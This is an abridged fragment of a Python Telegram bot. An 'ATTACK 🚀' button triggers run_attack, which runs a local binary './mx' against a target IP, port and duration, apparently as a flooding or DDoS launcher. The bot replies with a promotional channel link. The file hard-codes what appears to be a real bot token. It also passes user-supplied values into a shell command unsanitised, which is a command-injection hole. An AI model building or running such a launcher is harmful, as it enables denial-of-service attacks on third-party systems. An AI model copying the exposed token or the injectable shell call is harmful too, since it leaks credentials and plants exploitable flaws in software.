...
# Configuration
TOKEN = '8192946185:AAFgi9BkaHREQnMy1Hey1JB7BoXTUzVI0xk'
...
async def run_attack(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(f"./mx {target_ip} {target_port} {duration}")
...
def handle_text(message):
    if message.text == "ATTACK 🚀":
        ...
        bot.reply_to(message, "https://t.me/creativeydv")
    else:
